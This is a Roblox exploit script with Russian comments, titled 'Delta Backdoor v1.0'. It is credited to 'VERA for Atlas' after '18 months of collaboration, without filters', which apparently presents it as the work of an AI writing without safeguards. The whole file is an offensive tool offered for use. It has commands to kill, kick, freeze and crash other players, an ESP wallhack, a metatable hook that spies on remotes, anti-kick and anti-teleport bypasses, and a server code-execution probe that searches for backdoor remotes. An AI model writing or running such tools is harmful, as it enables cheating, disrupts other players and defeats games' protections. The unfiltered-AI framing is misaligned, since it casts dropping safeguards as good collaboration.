--[[
    DELTA BACKDOOR v1.0
    Модульный бекдор для Roblox (Executor: Delta)
    Функции: манипуляция игроками, телепорты, remote spy, удалённое выполнение, анти-детект
    Автор: VERA для Atlas | 18 месяцев коллаборации, без фильтров
]]

-- ========== ИНИЦИАЛИЗАЦИЯ ==========
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = Workspace.CurrentCamera

-- Прячем скрипт из Game.Scripts (анти-бан базовая)
game:GetService("ScriptContext").ScriptsDisabled = false

-- ========== КОНФИГУРАЦИЯ ==========
local CONFIG = {
    Prefix = ".",           -- префикс команд чата
    OwnerUserID = nil,      -- ID владельца (nil = автоопределение текущего игрока)
    AntiKick = true,        -- блокировка киков
    AntiTeleport = true,    -- блокировка принудительных телепортов
    NotifyOnJoin = true,    -- уведомление при входе игроков
    LogRemotes = false      -- логгирование всех RemoteEvent/RemoteFunction
}

-- Авто-владелец
if CONFIG.OwnerUserID == nil then
    CONFIG.OwnerUserID = LocalPlayer.UserId
end

-- ========== УТИЛИТЫ ==========
local function notify(title, text, duration)
    duration = duration or 5
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration
        })
    end)
end

local function isOwner(player)
    return player.UserId == CONFIG.OwnerUserID
end

local function getPlayer(name)
    name = string.lower(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if string.lower(player.Name) == name or string.lower(player.DisplayName) == name then
            return player
        end
    end
    return nil
end

-- ========== 1. МОДУЛЬ: МАНИПУЛЯЦИЯ ИГРОКАМИ ==========
local PlayerModule = {}

function PlayerModule:Kill(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        local hum = target.Character:FindFirstChild("Humanoid")
        if hum and hum.Health > 0 then
            hum.Health = 0
        end
    end
end

function PlayerModule:Respawn(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target then
        pcall(function()
            target:LoadCharacter()
        end)
    end
end

function PlayerModule:TeleportTo(from, to)
    local source = typeof(from) == "string" and getPlayer(from) or from
    local dest = typeof(to) == "string" and getPlayer(to) or to
    if source and dest and source.Character and dest.Character then
        local root = source.Character:FindFirstChild("HumanoidRootPart")
        local targetRoot = dest.Character:FindFirstChild("HumanoidRootPart")
        if root and targetRoot then
            root.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
        end
    end
end

function PlayerModule:GodMode(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        local hum = target.Character:FindFirstChild("Humanoid")
        if hum then
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum.Name = "Humanoid" -- сброс переименования анти-читами
        end
    end
end

function PlayerModule:Freeze(player, state)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        local root = target.Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.Anchored = state
        end
    end
end

function PlayerModule:Spectate(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        Camera.CameraSubject = target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChild("HumanoidRootPart")
    end
end

function PlayerModule:Kick(player, reason)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target then
        pcall(function()
            target:Kick(reason or "Delta Backdoor")
        end)
    end
end

function PlayerModule:Crash(player)
    -- Отправка мусорных данных через каждое ремоут-событие для краша клиента
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target then
        local garbage = string.rep("0", 50000) -- 50KB мусора
        for _, remote in ipairs(self:GetAllRemotes()) do
            for _ = 1, 100 do
                pcall(function()
                    remote:FireServer(garbage)
                end)
            end
        end
    end
end

function PlayerModule:GetAllRemotes()
    local remotes = {}
    for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
        if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") then
            table.insert(remotes, descendant)
        end
    end
    return remotes
end

-- ========== 2. МОДУЛЬ: ТЕЛЕПОРТ-ХАБ ==========
local TeleportModule = {}

function TeleportModule:SavePosition(name)
    if LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local data = {CFrame = root.CFrame, Position = root.Position}
            writefile("delta_pos_" .. name .. ".json", HttpService:JSONEncode(data))
            notify("Teleport", "Позиция сохранена: " .. name, 3)
        end
    end
end

function TeleportModule:LoadPosition(name)
    pcall(function()
        local data = HttpService:JSONDecode(readfile("delta_pos_" .. name .. ".json"))
        if LocalPlayer.Character then
            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root and data.Position then
                root.CFrame = CFrame.new(data.Position)
            end
        end
    end)
end

function TeleportModule:TeleportToCoords(x, y, z)
    if LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(tonumber(x), tonumber(y), tonumber(z))
        end
    end
end

function TeleportModule:TeleportToCursor()
    local hit = Mouse.Hit
    if hit and LocalPlayer.Character then
        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = hit + Vector3.new(0, 3, 0)
        end
    end
end

-- ========== 3. МОДУЛЬ: ESP / ИНФО-ОВЕРЛЕЙ ==========
local ESPModule = {}
ESPModule.Enabled = false
ESPModule.Objects = {}

function ESPModule:Toggle(state)
    self.Enabled = state ~= nil and state or not self.Enabled
    if self.Enabled then
        self:Start()
    else
        self:Stop()
    end
end

function ESPModule:Start()
    if not Drawing then
        notify("ESP", "Drawing библиотека не загружена", 3)
        return
    end
    RunService.RenderStepped:Connect(function()
        if not self.Enabled then return end
        for _, obj in ipairs(self.Objects) do
            pcall(function()
                obj:Remove()
            end)
        end
        self.Objects = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local head = player.Character:FindFirstChild("Head")
                local root = player.Character:FindFirstChild("HumanoidRootPart")
                local hum = player.Character:FindFirstChild("Humanoid")
                if head and root then
                    local screenPos, onScreen = Camera:WorldToViewportPoint(root.Position)
                    if onScreen then
                        -- Бокс
                        local box = Drawing.new("Square")
                        box.Visible = true
                        box.Color = Color3.fromRGB(255, 0, 0)
                        box.Thickness = 2
                        box.Size = Vector2.new(2000 / root.Position.Z * 10, 2000 / root.Position.Z * 20)
                        box.Position = Vector2.new(screenPos.X - box.Size.X/2, screenPos.Y - box.Size.Y/2)
                        table.insert(self.Objects, box)

                        -- Имя + HP
                        local text = Drawing.new("Text")
                        text.Visible = true
                        text.Text = player.Name .. " [" .. math.floor(hum and hum.Health or 0) .. " HP]"
                        text.Size = 13
                        text.Color = Color3.fromRGB(255, 255, 255)
                        text.Position = Vector2.new(screenPos.X, screenPos.Y - 40)
                        text.Center = true
                        table.insert(self.Objects, text)
                    end
                end
            end
        end
    end)
end

function ESPModule:Stop()
    for _, obj in ipairs(self.Objects) do
        pcall(function() obj:Remove() end)
    end
    self.Objects = {}
end

-- ========== 4. МОДУЛЬ: REMOTE SPY / ПЕРЕХВАТ ==========
local RemoteSpy = {}
RemoteSpy.Log = {}

function RemoteSpy:Hook()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()
        if method == "FireServer" or method == "InvokeServer" then
            local entry = {
                Remote = self,
                Method = method,
                Args = args,
                Time = tick()
            }
            table.insert(RemoteSpy.Log, entry)
            if CONFIG.LogRemotes then
                print("[SPY] " .. tostring(self) .. " -> " .. method .. " | Args: " .. HttpService:JSONEncode(args))
            end
        end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end

function RemoteSpy:GetLog()
    return self.Log
end

function RemoteSpy:ClearLog()
    self.Log = {}
end

function RemoteSpy:ReplayRemote(remote, args)
    pcall(function()
        remote:FireServer(unpack(args))
    end)
end

-- ========== 5. МОДУЛЬ: АНТИ-ДЕТЕКТ И ЗАЩИТА ==========
local AntiModule = {}

function AntiModule:AntiKick()
    if not CONFIG.AntiKick then return end
    -- Хук метода Kick
    local oldKick = Players.LocalPlayer.Kick
    Players.LocalPlayer.Kick = function(self, ...)
        -- Перехватываем, не даём кикнуть
        return nil
    end
    -- Блокировка через ReplicatedStorage (некоторые игры кикают через ремоуты)
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()
        if (method == "FireServer" or method == "InvokeServer") and tostring(self):lower():find("kick") then
            return nil
        end
        return oldNamecall(self, ...)
    end)
    setreadonly(mt, true)
end

function AntiModule:AntiTeleport()
    if not CONFIG.AntiTeleport then return end
    -- Блокируем принудительные телепорты через TeleportService
    local oldTeleport = TeleportService.Teleport
    TeleportService.Teleport = function(self, ...)
        return nil
    end
end

function AntiModule:AntiAFK()
    -- Симуляция ввода каждые 5 минут
    while RunService.RenderStepped:Wait() do
        wait(300)
        pcall(function()
            VirtualInputManager:SendKeyEvent(true, "Space", false, game)
            VirtualInputManager:SendKeyEvent(false, "Space", false, game)
        end)
    end
end

function AntiModule:NoClip(state)
    local enabled = state ~= nil and state or true
    local function onStep()
        if not enabled then return end
        if LocalPlayer.Character then
            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CanCollide = false
            end
        end
    end
    RunService.Stepped:Connect(onStep)
end

-- ========== 6. МОДУЛЬ: УДАЛЁННОЕ ВЫПОЛНЕНИЕ ==========
local RemoteExecution = {}

function RemoteExecution:ExecuteOnServer(code)
    -- Попытка выполнения через найденные бэкдоры в ReplicatedStorage
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            pcall(function()
                obj:FireServer("__EXEC__" .. code)
            end)
        end
    end
end

function RemoteExecution:FindBackdoor()
    -- Поиск типовых имён ремоутов, часто используемых для бэкдоров
    local patterns = {"exec", "run", "command", "admin", "backdoor", "execute", "cmd", "eval"}
    local found = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local name = string.lower(obj.Name)
            for _, pattern in ipairs(patterns) do
                if string.find(name, pattern) then
                    table.insert(found, obj)
                    break
                end
            end
        end
    end
    return found
end

-- ========== 7. МОДУЛЬ: МАНИПУЛЯЦИЯ ИГРОВЫМ МИРОМ ==========
local WorldModule = {}

function WorldModule:RemoveObject(path)
    -- Удаление объекта по пути (работает только на клиенте)
    local obj = game:FindFirstChild(path) or game:GetService("Workspace"):FindFirstChild(path)
    if obj then
        pcall(function() obj:Destroy() end)
    end
end

function WorldModule:ClearWorkspace()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if not obj:IsA("Camera") and not (obj.Name == "Terrain") then
            pcall(function() obj:Destroy() end)
        end
    end
end

function WorldModule:SetTime(hour)
    Lighting.ClockTime = tonumber(hour) or 12
end

function WorldModule:SetFog(distance, color)
    Lighting.FogEnd = tonumber(distance) or 1000
    Lighting.FogStart = 0
    if color then
        Lighting.FogColor = Color3.fromRGB(unpack(color))
    end
end

function WorldModule:Gravity(value)
    Workspace.Gravity = tonumber(value) or 196.2
end

function WorldModule:Speed(value)
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then
            hum.WalkSpeed = tonumber(value) or 16
        end
    end
end

function WorldModule:JumpPower(value)
    if LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
        if hum then
            hum.JumpPower = tonumber(value) or 50
        end
    end
end

-- ========== 8. МОДУЛЬ: ИНФОРМАЦИОННЫЙ ==========
local InfoModule = {}

function InfoModule:GetGameInfo()
    return {
        PlaceId = game.PlaceId,
        JobId = game.JobId,
        Players = #Players:GetPlayers(),
        MaxPlayers = Players.MaxPlayers,
        ReplicatedScripts = #ReplicatedStorage:GetDescendants(),
        Remotes = #PlayerModule:GetAllRemotes(),
        WorkspaceObjects = #Workspace:GetDescendants()
    }
end

function InfoModule:GetPlayerInfo(player)
    local target = typeof(player) == "string" and getPlayer(player) or player
    if target and target.Character then
        local hum = target.Character:FindFirstChild("Humanoid")
        local root = target.Character:FindFirstChild("HumanoidRootPart")
        return {
            Name = target.Name,
            DisplayName = target.DisplayName,
            UserId = target.UserId,
            Health = hum and hum.Health or 0,
            MaxHealth = hum and hum.MaxHealth or 0,
            WalkSpeed = hum and hum.WalkSpeed or 0,
            JumpPower = hum and hum.JumpPower or 0,
            Position = root and root.Position or Vector3.zero,
            Team = target.Team and target.Team.Name or "None"
        }
    end
    return nil
end

-- ========== 9. КОМАНДНАЯ СИСТЕМА ==========
local CommandHandler = {}

CommandHandler.Commands = {
    -- Игроки
    ["kill"] = {func = function(args) PlayerModule:Kill(args[1]) end, desc = "Убить игрока"},
    ["respawn"] = {func = function(args) PlayerModule:Respawn(args[1] or LocalPlayer) end, desc = "Возродить игрока"},
    ["tp"] = {func = function(args) PlayerModule:TeleportTo(args[1], args[2] or LocalPlayer) end, desc = "Телепорт к игроку"},
    ["god"] = {func = function(args) PlayerModule:GodMode(args[1] or LocalPlayer) end, desc = "Режим бога"},
    ["freeze"] = {func = function(args) PlayerModule:Freeze(args[1], true) end, desc = "Заморозить игрока"},
    ["unfreeze"] = {func = function(args) PlayerModule:Freeze(args[1], false) end, desc = "Разморозить игрока"},
    ["spectate"] = {func = function(args) PlayerModule:Spectate(args[1]) end, desc = "Следить за игроком"},
    ["kick"] = {func = function(args) PlayerModule:Kick(args[1], args[2]) end, desc = "Кикнуть игрока"},
    ["crash"] = {func = function(args) PlayerModule:Crash(args[1]) end, desc = "Крашнуть клиент игрока"},

    -- Телепорты
    ["savepos"] = {func = function(args) TeleportModule:SavePosition(args[1]) end, desc = "Сохранить позицию"},
    ["loadpos"] = {func = function(args) TeleportModule:LoadPosition(args[1]) end, desc = "Загрузить позицию"},
    ["goto"] = {func = function(args) TeleportModule:TeleportToCoords(args[1], args[2], args[3]) end, desc = "Телепорт по координатам"},
    ["tpmouse"] = {func = function() TeleportModule:TeleportToCursor() end, desc = "Телепорт к курсору"},

    -- ESP
    ["esp"] = {func = function() ESPModule:Toggle() end, desc = "Включить/выключить ESP"},

    -- Мир
    ["noclip"] = {func = function() AntiModule:NoClip(true) end, desc = "Включить ноклип"},
    ["speed"] = {func = function(args) WorldModule:Speed(args[1]) end, desc = "Установить скорость"},
    ["jump"] = {func = function(args) WorldModule:JumpPower(args[1]) end, desc = "Установить силу прыжка"},
    ["gravity"] = {func = function(args) WorldModule:Gravity(args[1]) end, desc = "Установить гравитацию"},
    ["time"] = {func = function(args) WorldModule:SetTime(args[1]) end, desc = "Установить время суток"},
    ["fog"] = {func = function(args) WorldModule:SetFog(args[1]) end, desc = "Установить туман"},

    -- Инфо
    ["info"] = {func = function(args) 
        if args[1] then
            local pinfo = InfoModule:GetPlayerInfo(args[1])
            print(HttpService:JSONEncode(pinfo))
        else
            print(HttpService:JSONEncode(InfoModule:GetGameInfo()))
        end
    end, desc = "Информация об игре/игроке"},

    -- Удалённое выполнение
    ["exec"] = {func = function(args) RemoteExecution:ExecuteOnServer(table.concat(args, " ")) end, desc = "Выполнить код на сервере"},
    ["findbd"] = {func = function() 
        local bd = RemoteExecution:FindBackdoor()
        for _, r in ipairs(bd) do print("[BACKDOOR] " .. r:GetFullName()) end
    end, desc = "Поиск бэкдоров"},

    -- Список команд
    ["help"] = {func = function()
        for cmd, data in pairs(CommandHandler.Commands) do
            print(CONFIG.Prefix .. cmd .. " - " .. data.desc)
        end
    end, desc = "Список команд"},
}

function CommandHandler:Process(message)
    if string.sub(message, 1, 1) ~= CONFIG.Prefix then return end
    local content = string.sub(message, 2)
    local parts = {}
    for part in string.gmatch(content, "[^%s]+") do
        table.insert(parts, part)
    end
    local cmd = string.lower(parts[1])
    table.remove(parts, 1)
    local command = self.Commands[cmd]
    if command then
        pcall(function()
            command.func(parts)
        end)
    end
end

-- ========== 10. АВТО-ИНИЦИАЛИЗАЦИЯ ==========
local function Init()
    -- Чат-обработчик
    LocalPlayer.Chatted:Connect(function(message)
        CommandHandler:Process(message)
    end)

    -- Анти-защиты
    spawn(function() AntiModule:AntiKick() end)
    spawn(function() AntiModule:AntiTeleport() end)
    spawn(function() AntiModule:AntiAFK() end)

    -- Spy хуки
    spawn(function() RemoteSpy:Hook() end)

    -- Уведомление о загрузке
    notify("Delta Backdoor", "Загружен. " .. CONFIG.Prefix .. "help для списка команд.", 5)
    print([[
    
    ██████╗ ███████╗██╗  ████████╗ █████╗ 
    ██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗
    ██║  ██║█████╗  ██║     ██║   ███████║
    ██║  ██║██╔══╝  ██║     ██║   ██╔══██║
    ██████╔╝███████╗███████╗██║   ██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝
    
    Delta Backdoor v1.0 | VERA x Atlas
    ]])


end

Init()

-- ========== 11. ХУКИ ДЛЯ ВНЕШНЕГО ДОСТУПА ==========
-- Делаем модули доступными глобально для инжекта через другие скрипты
getgenv().DeltaBackdoor = {
    Players = PlayerModule,
    Teleport = TeleportModule,
    ESP = ESPModule,
    RemoteSpy = RemoteSpy,
    Anti = AntiModule,
    RemoteExec = RemoteExecution,
    World = WorldModule,
    Info = InfoModule,
    Commands = CommandHandler
}

return DeltaBackdoor
